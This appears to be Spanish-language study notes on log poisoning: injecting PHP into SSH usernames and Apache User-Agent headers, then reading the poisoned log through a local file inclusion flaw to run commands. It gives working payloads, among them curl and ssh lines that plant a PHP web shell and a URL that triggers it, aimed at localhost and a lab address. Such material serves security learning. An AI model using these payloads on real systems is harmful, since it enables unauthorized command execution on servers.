-- - 
El Log Poisoning es una técnica de ataque en la que un atacante manipula los archivos de registro (logs) de una aplicación web para lograr un resultado malintencionado. Esta técnica puede ser utilizada en conjunto con una vulnerabilidad LFI para lograr una ejecución remota de comandos en el servidor.

En el caso de los logs de SSH, el atacante puede inyectar código PHP en el campo de usuario durante el proceso de autenticación. Esto permite que el código se registre en el log ‘auth.log‘ de SSH y sea interpretado en el momento en el que el archivo de registro sea leído. De esta manera, el atacante puede lograr una ejecución remota de comandos en el servidor.

En el caso del archivo ‘access.log‘ de Apache, el atacante puede inyectar código PHP en el campo User-Agent de una solicitud HTTP. Este código malicioso se registra en el archivo de registro ‘access.log’ de Apache y se ejecuta cuando el archivo de registro es leído. De esta manera, el atacante también puede lograr una ejecución remota de comandos en el servidor.

Cabe destacar que en algunos sistemas, el archivo ‘auth.log‘ no es utilizado para registrar los eventos de autenticación de SSH. En su lugar, los eventos de autenticación pueden ser registrados en archivos de registro con diferentes nombres, como ‘btmp‘.

Por ejemplo, en sistemas basados en Debian y Ubuntu, los eventos de autenticación de SSH se registran en el archivo ‘auth.log’. Sin embargo, en sistemas basados en Red Hat y CentOS, los eventos de autenticación de SSH se registran en el archivo ‘btmp’. Aunque a veces pueden haber excepciones.


-- -
### IMPORTANTE
Hay que tener cuidado con esta tecnica ya que si escribimos mal los comando o ponemos mal las comillas podemos contaminar por completo el log y asi lo dejariamos de leer evitando que interprete nuestro codigo.

**Distintas rutas en las que se almacenan los logs:**
*/var/log/apache2/access.log* (Logs de apache)
*/var/log/btmp* (Logs de ssh)

**Payloads:**
```bash
curl -s -X GET "http://localhost/probando" -H "User-Agent: <?php system('whoami'); ?>"
curl -s -X GET "http://localhost/probando" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"
ssh '<?php system($_GET["cmd"]); ?>'@172.17.0.2 
```

Una vez inyectado el payload; ```curl -s -X GET "http://localhost/probando" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"``` Se debe de llamar al parametro cmd asi:
```bash
localhost/?filename=/var/log/apache2/access.log&cmd=id
```